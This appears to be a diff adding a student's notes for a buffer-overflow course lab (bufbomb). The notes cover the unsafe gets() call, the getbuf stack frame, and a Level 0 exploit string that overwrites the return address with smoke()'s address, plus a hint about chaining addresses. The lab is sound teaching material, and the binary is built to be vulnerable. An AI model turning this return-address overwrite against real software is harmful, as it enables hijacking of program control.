@@ -1,0 +1,88 @@
+char* gets (char* str)	//gets from stdin and write it into str
+	//flawed: doesn't account for input size, might cause buffer overflow
+	//stops at a terminating character (null byte or end line)
+
+=========================================
+
+Buffer Lab:
+-Create object dump and look for getbuf
+
+./makecookie UCLAID //outputs hex interpretation of your ID (for grading purposes)
+
+./hex2raw //interprets hex values into strings
+31 --> 1
+31 32 33 34 35 36 37 38 39... --> 1234...
+61 --> a
+
+//can be used to determine input that goes to a certain address
+//remember little endianess: might need to enter target address "backwards"!
+
+./bufbomb -u USERID //runs bufbomb
+or use ./bufbomb -u 1234 < smoke_answer.txt
+
+./hex2raw < exploit.txt
+OR
+cat exploit.txt | ./hex2raw | ./bufbomb -u 123456789 //pipe, where exploit.txt has ab 90 04 08
+
+
+
+=========================================
+
+getbuf:
+-push ebp
+-move esp to ebp
+-allocate 40 bytes of memory for esp by moving down (sub $0x28)
+-move address of guy 32 down from ebp into eax
+-value of eax goes to esp
+-call Gets
+
+[ret	]
+[old ebp]
+[	]
+[	]
+[	]
+[	]
+[	]
+[	]
+[	]
+eax[	] //from here to just under old ebp is 32 bytes allocated for char buf[32]
+[	] //to write more than that will wipe out the old ebp! 
+[	] //if we write over the ret value, our leave and ret functions in getbuf can take us to the 	address at that overwritten ret (i.e. some password-protected area, if we have the address)
+esp[eax	]
+[ret	]
+
+=========================================
+
+leave:
+-moves ebp into esp
+-pop ebp
+-ret
+
+=========================================
+
+Level 0:
+[ret	]
+[objdmp	]
+[local	]
+[ret	] //we only want to 
+[	]
+[	]
+[	]
+[	]
+[	]
+
+1. Find address of smoke() using buflab dump, search for smoke (i.e. 080490ab)
+2. Translate it into a string: ab 90 04 08 ==hex2raw==> 
+3. Put it into the ret value
+
+exploit.txt:
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 90 04 08
+
+//32 0-bytes (00) to overwrite the regular 32-allocated bytes
+//4 extra 0-bytes to overwrite old ebp
+//the address specified to write into ret
+
+//those 32 spaces could be used to hold other addresses that can be called by the ret value
+//that way we can call a series of instructions!
+
+---------------------------------------------------------------------------------------------------
